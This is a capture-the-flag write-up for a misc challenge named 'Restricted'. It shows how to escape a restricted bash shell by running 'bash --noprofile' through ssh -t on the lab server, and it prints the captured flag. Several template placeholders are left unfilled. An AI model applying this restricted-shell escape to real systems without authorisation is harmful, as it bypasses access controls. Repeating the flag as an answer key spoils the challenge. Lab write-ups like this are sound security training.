# Challenge Name: Restricted

**Category:** misc
**Points:** [Point value]  
**Author:** [Your name]  
**Team:** [Your team name]  
**Completion Date:** [Date of comple7tion]

## Introduction

You 're still trying to collect information for your research on the alien relic. Scientists contained the memories of ancient egyptian mummies into small chips, where they could store and replay them at will. Many of these mummies were part of the battle against the aliens and you suspect their memories may reveal hints to the location of the relic and the underground vessels. You managed to get your hands on one of these chips but after you connected to it, any attempt to access its internal data proved futile. The software containing all these memories seems to be running on a restricted environment which limits your access. Can you find a way to escape the restricted environment ?



## Tools Used

- orange

## Initial Analysis

TThe challenge contains a bash profile and a sshd_config file.

## Detailed Methodology

### Step 1: Analyze challenge files

Analyzed the files and discovered that i can use ssh with the user restricted to access a restricted command line. 
ssh restricted@159.65.94.38 -p 32573 

### Step 2: Poke around on the server

The server allows vcery limited commands and with restrictions on commands like cd.
But ssh runs unrestricted. 
I connected again with ssh using the t "bash --noprofile" argument.
This command will attempt to connect to the remote server with the IP address 159.65.94.38 on port 32573 using the restricted user. The -X flag enables X11 forwarding, and the -t flag forces pseudo-terminal allocation, which allows you to execute the specified command (bash --noprofile in this case) on the remote server.
## Flag Capture

ssh -X restricted@159.65.94.38 -p 32573 -t "bash --noprofile"
cd flag_8dpsy
cat flag_8dpsy
HTB{r35tr1ct10n5_4r3_p0w3r1355}


<details>
<summary>Click to reveal the flag</summary>

